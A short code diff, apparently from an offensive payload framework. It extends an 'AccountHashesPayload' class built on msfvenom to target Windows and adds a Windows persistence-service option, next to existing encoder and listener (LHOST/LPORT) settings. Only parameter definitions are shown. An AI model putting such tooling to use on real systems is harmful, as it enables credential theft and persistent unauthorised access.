@@ -12,13 +12,15 @@ msfvenom = programs.program_wrapper_factory("msfvenom")
 
 class AccountHashesPayload(Payload):
     AUTHORS = ("GlobularOne",)
-    TARGET_OS_LIST = ("GNU/Linux",)
+    TARGET_OS_LIST = ("GNU/Linux", "Microsoft Windows")
     INPUTS = (
         ("ENCODER", "x86/shikata_ga_nai", -1, "Encoder to use for x86"),
         ("LINUX_SERVICE_NAME", "", -1,
          "Name of the persistance service for Linux", True),
         ("LINUX_SERVICE_DESCRIPTION", "", -1,
          "Description of the persistance service for Linux", True),
+        ("WINDOWS_SERVICE_NAME", "", -1,
+         "Name of the persistance service for Windows", True),
         ("LHOST", "", -1, "Local host (Listener address)", True),
         ("LPORT", 8443, -1, "Local port (Listener port)"),
         ("LURL", "", -1, "Local HTTP address, if left empty will be generated randomly"),
